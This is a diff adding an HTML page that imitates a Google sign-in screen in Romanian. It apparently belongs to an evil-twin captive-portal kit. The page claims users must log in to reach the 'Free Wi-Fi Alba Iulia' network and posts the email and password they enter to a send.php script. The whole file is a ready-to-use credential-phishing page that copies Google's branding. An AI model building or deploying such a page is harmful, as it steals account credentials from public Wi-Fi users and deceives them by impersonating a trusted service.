@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<style>
+  html, body 
+  {
+    font-family: Arial, sans-serif;
+    font-size: 13px;
+    direction: ltr;
+    -webkit-text-size-adjust: none;
+  }
+
+  @media only screen and (max-width: 900px) 
+  {
+    body 
+    {
+      margin-left: 5.5%;
+    }
+  }
+
+  button, input[type=button], input[type=submit] 
+  {
+    font-family: Arial, sans-serif;
+  }
+  
+  input[type=email], input[type=number], input[type=password] 
+  {
+    -moz-appearance: none;
+    -webkit-appearance: none;
+    appearance: none;
+    display: inline-block;
+    height: 40px;
+    padding: 0 8px;
+    margin: 0;
+    background: #fff;
+    border: 1px solid #d9d9d9;
+    border-top: 1px solid #c0c0c0;
+    -moz-box-sizing: border-box;
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+    -moz-border-radius: 1px;
+    -webkit-border-radius: 1px;
+    border-radius: 1px;
+    font-size: 15px;
+    color: #404040;
+  }
+
+  input[type=email]:focus, input[type=number]:focus, input[type=password]:focus
+  {
+    outline: none;
+    border: 1px solid #4d90fe;
+    -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+    -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+    box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  }
+  
+  .wrapper 
+  {
+    position: relative;
+    min-height: 100%;
+  }
+  
+  .content 
+  {
+    padding: 0 44px;
+  }
+  
+  .logo
+  {
+      margin-top: -3rem;
+  }
+
+  .google-header-bar.centered 
+  {
+    border: 0;
+    height: 100px;
+  }
+  
+  .google-header-bar.centered .header .logo 
+  {
+    float: none;
+    margin: 20px auto 30px;
+    display: block;
+  }
+
+  .card 
+  {
+    background-color: #f0f0f0;
+    padding: 20px 25px 30px;
+    margin: 0 auto 25px;
+    width: 304px;
+    -moz-border-radius: 2px;
+    -webkit-border-radius: 2px;
+    border-radius: 2px;
+    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  }
+
+  .card *:first-child 
+  {
+      margin-top: 0;
+  }
+  
+  .rc-button 
+  {
+  display: inline-block;
+  min-width: 46px;
+  text-align: center;
+  color: #444;
+  font-size: 14px;
+  font-weight: 700;
+  height: 36px;
+  padding: 0 8px;
+  line-height: 36px;
+  -moz-border-radius: 3px;
+  -webkit-border-radius: 3px;
+  border-radius: 3px;
+  -o-transition: all 0.218s;
+  -moz-transition: all 0.218s;
+  -webkit-transition: all 0.218s;
+  transition: all 0.218s;
+  border: 1px solid #dcdcdc;
+  background-color: #f5f5f5;
+  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
+  -o-transition: none;
+  -moz-user-select: none;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: default;
+  }
+
+  .card .rc-button 
+  {
+    width: 100%;
+    padding: 0;
+  }
+  
+  .rc-button-submit 
+  {
+    border: 1px solid #3079ed;
+    color: #fff;
+    text-shadow: 0 1px rgba(0,0,0,0.1);
+    background-color: #4d90fe;
+    background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
+    background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
+    background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
+    background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
+    background-image: linear-gradient(top,#4d90fe,#4787ed);
+  }
+  
+  .rc-button-submit:hover 
+  {
+    border: 1px solid #2f5bb7;
+    color: #fff;
+    text-shadow: 0 1px rgba(0,0,0,0.3);
+    background-color: #357ae8;
+    background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
+    background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
+    background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
+    background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
+    background-image: linear-gradient(top,#4d90fe,#357ae8);
+  }
+
+
+  .banner 
+  {
+    text-align: center;
+  }
+
+  .signin-card 
+  {
+    width: 274px;
+    padding: 40px 40px;
+  }
+  
+  .signin-card .profile-img 
+  {
+    width: 96px;
+    height: 96px;
+    margin: 0 auto 10px;
+    display: block;
+    -moz-border-radius: 50%;
+    -webkit-border-radius: 50%;
+    border-radius: 50%;
+  }
+  
+  .signin-card .profile-name 
+  {
+    font-size: 16px;
+    font-weight: bold;
+    text-align: center;
+    margin: 10px 0 0;
+    min-height: 1em;
+  }
+  
+  .signin-card input[type=email], .signin-card input[type=password], .signin-card input[type=text], .signin-card input[type=submit] 
+  {
+    width: 100%;
+    display: block;
+    margin-bottom: 10px;
+    z-index: 1;
+    position: relative;
+    -moz-box-sizing: border-box;
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+  }
+  
+  .signin-card #Email, .signin-card #Passwd, .signin-card #Email + .stacked-label 
+  {
+    margin-top: 20px;
+  }
+  
+  .signin-card #reauthEmail 
+  {
+    display: block;
+    margin-bottom: 10px;
+    line-height: 36px;
+    padding: 0 8px;
+    font-size: 15px;
+    color: #404040;
+    line-height: 2;
+    margin-bottom: 10px;
+    font-size: 14px;
+    text-align: center;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    -moz-box-sizing: border-box;
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+  }
+
+  .WiFiText
+  {
+      font-size: 1.1rem;
+      font-family: Georgia, serif;
+  }
+
+</style>
+
+
+<html>
+  <meta http-equiv = "content-type" content = "text/html;charset=UTF-8">
+  <meta charset = "utf-8">
+  <meta content = "width=300, initial-scale=1" name = "viewport">
+  <meta name = "jingle" value = "notranslate">
+  
+  <title>Conectează-te la contul Google</title>
+
+  <div class="google-header-bar  centered">
+    <div class="header content clearfix">
+      <img class="logo" src="GoogleLogo.png" style="height:100px; width: 160px;">
+    </div>
+  </div>
+  
+  <div class="main content clearfix">
+    <div class="banner">
+      <h3 class = "WiFiText">
+        Conectează-te pentru a accesa rețeaua de Wi-Fi:
+      </h3>
+      <h3 class = "WiFiText">
+        "Free Wi-Fi Alba Iulia"
+      </h3>
+    </div>
+
+    <div class="card signin-card clearfix">
+      <img class="profile-img" src="ProfilePic.png">
+  
+      <form novalidate="" method="post" action="send.php">
+        <input id="Email" name="email" type="email" placeholder="Email" spellcheck="false">
+        <input id="Passwd" name="password" type="password" placeholder="Parola">
+        <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Conectează-te">
+      </form>
+    </div>
+  </div>
+</html>
